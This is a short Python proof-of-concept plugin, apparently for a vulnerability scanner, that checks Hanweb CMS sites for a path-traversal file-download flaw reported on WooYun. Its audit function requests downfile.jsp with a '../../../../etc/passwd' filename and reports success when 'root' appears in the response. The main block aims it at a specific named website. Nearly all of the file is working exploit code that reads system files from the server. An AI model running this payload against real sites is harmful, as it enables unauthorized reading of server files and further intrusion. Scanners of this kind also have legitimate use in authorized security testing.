#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name:大汉网络任意文件包含漏洞
#Refer:http://www.wooyun.org/bugs/wooyun-2015-092339
#Author:xq17
def assign(service, arg):
    if service == "hanweb":
        return True, arg

def audit(arg):
    payload = arg + "vc/vc/columncount/downfile.jsp?savename=a.txt&filename=../../../../../../../../etc/passwd"
    code, head, res, errcode, _ = curl.curl2(payload)
    if code ==200 and 'root' in res :
         security_info(payload+':Any reading ' )
         
if __name__ == '__main__':
        from dummy import *
        audit(assign('hanweb','http://www.sinoagent.com/')[1])